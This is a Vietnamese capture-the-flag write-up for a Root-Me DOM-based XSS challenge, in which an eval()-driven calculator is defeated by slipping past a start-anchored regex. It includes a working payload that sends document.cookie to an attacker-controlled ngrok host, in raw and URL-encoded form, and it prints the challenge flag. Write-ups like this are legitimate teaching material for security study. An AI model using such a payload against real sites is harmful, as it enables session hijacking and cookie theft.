# XSS DOM Based - Eval
## Solution
Ban đầu challenge cung cấp cho chúng ta một form như thế này


![image](https://user-images.githubusercontent.com/86184794/159875484-38691ee1-2411-4f5f-b7a2-459ed66443ca.png)


Đây là một chương trình máy tính. Hãy nhập thử một phép tính rồi vào Element trong Devtool để xem sao.

![image](https://user-images.githubusercontent.com/86184794/159875962-096ab8be-85b2-4001-904e-619976faa146.png)

Ở đây ta thấy chương trình sử dụng function eval() để thực hiện các phép tính và render ra kết quả.

Việc sử dụng hàm eval() thường sẽ gây ra một số lỗi XSS và cộng đồng lập trình khuyến cáo là không nên sử dụng.

Nhưng ở đây chương trình sử dụng regex  /^\d+[\+|\-|\*|\/]\d+/ để kiểm tra dữ liệu đầu vào nên em phải tìm cách bypass regex trên. Nhưng với kí tự ^ thì chương trình chỉ kiểm tra phần đầu của chuỗi nhập vào có định dạng vào số + số, số - số, số * số, số / số thôi. Vì thế em sẽ nhập là 1+1, alert(1) thì sẽ bypass được regex. Nhưng regex lại lọc kí tự () nên em sẽ thay là 1+1, alert `1` thì sẽ bypass được.

![image](https://user-images.githubusercontent.com/86184794/159879989-26ec4138-872a-493c-868a-1013d3530c3d.png)

Khi đã bypass được chương trình sẽ thì em sẽ chèn đoạn code vào để lừa lấy cookie của server sau đó gửi về server ảo dưới quyền kiểm soát của em.

Giờ em phải tạo server ảo trong máy kali.

![image](https://user-images.githubusercontent.com/86184794/159881365-241cb8d2-e97d-470a-bafb-e01ab135bd98.png)

Server đang ở localhost port 9999

Sau đó public server lên internet bằng ngrok.

![image](https://user-images.githubusercontent.com/86184794/159881531-6fe6a7ee-551c-4cab-b49c-86c854a780f7.png)


payload để lừa lấy cookie của server.

```
1+1, document.location="http://41da-113-185-75-222.ngrok.io?cookie=" + document.cookie
```
![image](https://user-images.githubusercontent.com/86184794/159884920-9dd93877-f1b9-4549-af84-9b2f2a0fd1a0.png)
Sau khi submit paylooad bên tab main nhưng không có có cookie trả lại nên em thử qua bên tab contact để submit thử.


![image](https://user-images.githubusercontent.com/86184794/159885617-4a8ec7df-d97a-406a-b103-730600ccbb8f.png)

Bên tab contact yêu cầu submit đường link nên cần convert chuỗi payload sang dạng url.

```
1%2B1%2C%20document.location%3D%22http%3A%2F%2F41da-113-185-75-222.ngrok.io%3Fcookie%3D%22%20%2B%20document.cookie
```

Cuối cùng thêm link gốc của challenge thì ta được url hoàn chỉnh như sau.

```
http://challenge01.root-me.org/web-client/ch34/?calculation=1%2B1%2C%20document.location%3D%22http%3A%2F%2F41da-113-185-75-222.ngrok.io%3Fcookie%3D%22%20%2B%20document.cookie
```

Kết quả sau khi submit url.

![image](https://user-images.githubusercontent.com/86184794/159886962-4e1f7685-1729-4321-ab21-d36d17c7704f.png)


Flag: rootme{Eval_Is_DangER0us}
